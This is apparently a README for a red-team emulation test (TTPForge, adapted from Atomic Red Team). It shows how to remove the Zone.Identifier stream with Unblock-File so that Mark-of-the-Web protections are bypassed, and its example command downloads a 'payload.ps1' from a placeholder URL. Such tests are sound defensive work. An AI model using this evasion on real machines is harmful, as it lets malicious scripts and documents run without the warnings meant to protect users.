# Remove the Zone.Identifier alternate data stream

## Description
Removes Zone.Identifier alternate data stream (ADS) from downloaded files to bypass Mark-of-the-Web (MotW) protections. Allows malicious scripts to execute without triggering PowerShell execution policy restrictions and enables Office documents to open without Protected View.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **file_to_download**: File to download and have the Zone.Identifier removed (default: `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.md`)
- **file_path**: File to have the Zone.Identifier removed (default: `C:\Users\Public\malicious.bin`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//defense-evasion/remove-zone-identifier-ads/ttp.yaml \
  --file_to_download "https://example.com/payload.ps1" \
  --file_path "C:\Temp\script.ps1"
```

## Steps
1. **ensure_test_file_exists**: Downloads a file from the specified URL and manually sets the Zone.Identifier ADS with ZoneId=3 (Internet zone) to simulate a file downloaded from the internet.
2. **remove_zone_identifier**: Uses the Unblock-File PowerShell cmdlet to remove the Zone.Identifier alternate data stream from the file, effectively unmarking it as downloaded from the internet.
